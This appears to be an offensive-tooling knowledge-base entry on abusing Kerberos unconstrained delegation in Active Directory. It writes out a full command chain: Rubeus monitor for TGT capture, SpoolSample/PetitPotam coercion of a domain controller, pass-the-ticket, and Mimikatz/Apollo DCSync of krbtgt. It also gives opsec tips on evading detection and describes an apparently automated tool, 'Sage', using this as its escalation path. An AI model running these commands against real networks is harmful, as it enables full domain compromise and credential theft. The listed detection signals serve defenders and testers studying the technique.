---
name: Unconstrained Delegation Abuse
category: delegation-abuse
subcategories: [unconstrained-delegation, tgt-capture, coercion]
tradecraft_tags: [unconstrained-delegation, tgt-capture, rubeus-monitor, coercion, technique]
mitre_attack:
  - id: T1558
    name: Steal or Forge Kerberos Tickets
source:
  url: https://adsecurity.org/?p=1667
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  Coercion triggers: PrintSpooler / MS-EFSRPC calls to the target (see SpoolSample, Coercer).
  TGT capture: Rubeus monitor running on the compromised host shows incoming tickets. The
  incoming TGT is a DC authentication event (Event 4769 for TGS, Event 4624 for logon).
  MDI detects unconstrained delegation abuse patterns (TGT forwarding from non-DC).
usage_examples:
  - description: Full unconstrained delegation TGT capture chain
    args: "# 1. Start Rubeus monitor on compromised unconstrained-delegation machine:\nRubeus.exe monitor /interval:1 /filteruser:DC01$\n# 2. Trigger coercion from separate session:\nSpoolSample.exe DC01.north.sevenkingdoms.local COMPROMISED.north.sevenkingdoms.local\n# 3. Rubeus captures the DC$ TGT\n# 4. Pass-the-ticket:\nRubeus.exe ptt /ticket:<captured-TGT>\n# 5. DCSync using the DC machine account ticket:\nMimikatz sekurlsa or Apollo dcsync (requires domain controller context)"
opsec_notes: |
  Unconstrained delegation hosts are high-value targets AND high-detection-risk.
  They are typically listed in BloodHound and known to defenders as sensitive assets.
  Running Rubeus monitor on such a host is itself suspicious if EDR process monitoring
  sees an unusual process with network socket activity. Coercion events are detectable.
  The window between coercion and TGT capture must be fast — use a short Rubeus
  monitor interval.
gotchas: |
  This is a TECHNIQUE that requires: (1) code execution (local-admin+) on a machine
  with unconstrained delegation configured, (2) the ability to coerce DC authentication
  to that machine. DCs themselves have unconstrained delegation but exploiting a DC's
  own delegation is trickier. Non-DC computers with unconstrained delegation are
  typically Exchange servers, legacy SQL servers, or old application servers — identify
  via SharpHound or PowerView.
related_ttps: [rubeus, spoolsample, coercer, mimikatz, sharphound]
alternatives: [rbcd-abuse, krbrelay-rbcd]
common_args: {}
last_updated: 2026-05-29
---

# Unconstrained Delegation Abuse

A technique for capturing Domain Controller TGTs from a compromised machine that has
"Trust this computer for delegation to any service" (unconstrained delegation) configured.
When a DC is coerced to authenticate to the unconstrained-delegation machine, the DC's
TGT is forwarded and stored in LSASS on the attacker's machine — capturable by Rubeus.
With the DC's TGT, an attacker can impersonate the DC for DCSync.

## The Attack Chain

```
Prerequisite: Code execution on a machine with TrustedForDelegation = True
              (NOT the DC — a member server, application server, etc.)

1. Check: Get-DomainComputer -Unconstrained (via SharpHound/PowerView)
2. On compromised host: Rubeus.exe monitor /interval:1 /filteruser:TARGET_DC$
3. Coercion: SpoolSample.exe DC01.DOMAIN COMPROMISED.DOMAIN
   (or Coercer, PetitPotam against non-DC targets)
4. Rubeus captures the DC$'s TGT in the monitor output
5. Inject TGT: Rubeus.exe ptt /ticket:<base64TGT>
6. Exploit: Apollo dcsync /domain:X /user:krbtgt
            or Mimikatz lsadump::dcsync /user:krbtgt
```

## Why This Matters

Unconstrained delegation machines are "golden bridges" — any computer that authenticates
to them for any service leaves its TGT there. Coercing DCs to authenticate is
straightforward (PrintSpooler works on most DCs still).

## Typical use cases
- Compromise Exchange / SQL / application server → coerce DC → get DC TGT → DCSync
- Escalate from local admin on any unconstrained-delegation machine to Domain Compromise

## How Sage uses this
SharpHound identifies unconstrained delegation computers. Sage uses SpoolSample (inline_assembly)
for coercion and Rubeus monitor for TGT capture. The chain is Sage's high-value escalation
path in environments with legacy unconstrained-delegation machines.
